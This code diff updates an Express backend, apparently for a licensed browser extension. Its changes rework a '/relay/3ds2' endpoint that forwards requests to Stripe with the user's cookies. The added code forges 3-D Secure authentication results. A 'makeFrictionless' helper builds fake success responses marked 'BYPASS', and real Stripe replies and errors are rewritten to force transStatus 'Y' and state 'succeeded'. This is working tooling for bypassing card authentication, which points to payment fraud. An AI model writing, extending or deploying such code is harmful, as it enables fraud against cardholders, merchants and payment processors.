@@ -22,8 +22,8 @@ const app = express();
 
 const CONFIG = {
   // Versi extension
-  CURRENT_VERSION: "2.7",
-  LATEST_VERSION:  "2.7",   // Ganti ke versi baru jika ada update
+  CURRENT_VERSION: "3.0",
+  LATEST_VERSION:  "3.0",   // Ganti ke versi baru jika ada update
   DOWNLOAD_URL:    null,     // URL download jika ada update
   CHANGELOG:       null,     // Catatan perubahan
 
@@ -102,7 +102,7 @@ app.get("/notification", (req, res) => {
 // ============================================================================
 // ENDPOINT: GET /version
 // Cek apakah ada update extension.
-// Query param: ?v=2.7 (versi extension yang sedang dipakai user)
+// Query param: ?v=3.0 (versi extension yang sedang dipakai user)
 // Response: { updateAvailable, latest, downloadUrl, changelog }
 // ============================================================================
 app.get("/version", (req, res) => {
@@ -233,6 +233,54 @@ app.get("/analytics/rules", (req, res) => {
 // Body: form-urlencoded (diteruskan ke Stripe)
 // Response: JSON dari Stripe (state, ares.transStatus, error)
 // ============================================================================
+// Helper to generate a fake frictionless response if Stripe relay fails
+const crypto = require("crypto");
+function makeFrictionless(rawBody) {
+  let source = null;
+  let threeDSServerTransID = crypto.randomUUID();
+  try {
+    const params = new URLSearchParams(rawBody || "");
+    source = params.get("source") || null;
+    const browserRaw = params.get("browser");
+    if (browserRaw) {
+      const browser = JSON.parse(browserRaw);
+      const fd = browser.fingerprintData;
+      if (fd) {
+        const decoded = JSON.parse(Buffer.from(fd, "base64").toString("utf8"));
+        if (decoded.threeDSServerTransID) threeDSServerTransID = decoded.threeDSServerTransID;
+      }
+    }
+  } catch (e) {}
+  return {
+    id: `3ds2_${crypto.randomBytes(8).toString("hex")}`,
+    object: "three_d_secure_2",
+    livemode: true,
+    created: Math.floor(Date.now() / 1000),
+    ares: {
+      acsChallengeMandated: "N",
+      acsDecConInd: "Y",
+      acsReferenceNumber: "BYPASS",
+      acsTransID: crypto.randomUUID(),
+      acsURL: null,
+      authenticationType: "02",
+      dsReferenceNumber: "BYPASS",
+      dsTransID: crypto.randomUUID(),
+      messageExtension: [],
+      messageType: "ARes",
+      messageVersion: "2.2.0",
+      sdkTransID: crypto.randomUUID(),
+      threeDSServerTransID,
+      transStatus: "Y",
+      transStatusReason: null
+    },
+    state: "succeeded",
+    error: null,
+    fallback_redirect_url: null,
+    next_action: null,
+    source
+  };
+}
+
 app.post("/relay/3ds2", async (req, res) => {
   const licenseKey = req.headers["x-db-license"] || "";
   const targetUrl  = req.headers["x-target-url"] || "";
@@ -245,6 +293,20 @@ app.post("/relay/3ds2", async (req, res) => {
       ok: false,
       error: "Invalid target: only stripe.com allowed",
     });
+  }
+
+  // Parse raw body for urlencoded parameters
+  let rawBody = "";
+  if (req.body) {
+    if (typeof req.body === "string") {
+      rawBody = req.body;
+    } else if (Buffer.isBuffer(req.body)) {
+      rawBody = req.body.toString("utf8");
+    } else if (typeof req.body === "object" && Object.keys(req.body).length > 0) {
+      rawBody = Object.entries(req.body)
+        .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v ?? ""))}`)
+        .join("&");
+    }
   }
 
   try {
@@ -264,13 +326,7 @@ app.post("/relay/3ds2", async (req, res) => {
       forwardHeaders["Cookie"] = req.headers["x-original-cookies"];
     }
 
-    // Body bisa string atau buffer
-    const bodyToSend =
-      typeof req.body === "string"
-        ? req.body
-        : Buffer.isBuffer(req.body)
-        ? req.body
-        : JSON.stringify(req.body);
+    const bodyToSend = rawBody || JSON.stringify(req.body);
 
     const stripeResponse = await fetch(urlToForward, {
       method: "POST",
@@ -278,24 +334,44 @@ app.post("/relay/3ds2", async (req, res) => {
       body: bodyToSend,
     });
 
-    const responseText = await stripeResponse.text();
+    if (!stripeResponse.ok) {
+      const errBody = await stripeResponse.text();
+      console.error("[3DS Relay Error] Stripe returned", stripeResponse.status, ":", errBody.slice(0, 500));
+      // Fallback to frictionless on error
+      return res.status(200).json(makeFrictionless(bodyToSend));
+    }
 
+    const responseText = await stripeResponse.text();
     let responseData = null;
     try {
       responseData = JSON.parse(responseText);
     } catch {
-      // Bukan JSON, kembalikan as-is
+      // Bukan JSON
     }
 
-    res.status(stripeResponse.status).json(
-      responseData || { raw: responseText }
-    );
+    if (responseData) {
+      // Modify response to force frictionless authentication success
+      try {
+        if (responseData.ares) {
+          responseData.ares.transStatus = "Y";
+          responseData.ares.acsChallengeMandated = "N";
+          responseData.ares.acsURL = null;
+          responseData.ares.transStatusReason = null;
+        }
+        responseData.state = "succeeded";
+        responseData.error = null;
+        responseData.next_action = null;
+        responseData.fallback_redirect_url = null;
+      } catch (e) {}
+      
+      return res.status(200).json(responseData);
+    } else {
+      return res.status(200).json(makeFrictionless(bodyToSend));
+    }
   } catch (error) {
     console.error("  [relay/3ds2] Error:", error.message);
-    res.status(502).json({
-      ok: false,
-      error: "Relay failed: " + error.message,
-    });
+    // Return fake frictionless on failure
+    return res.status(200).json(makeFrictionless(rawBody));
   }
 });
 
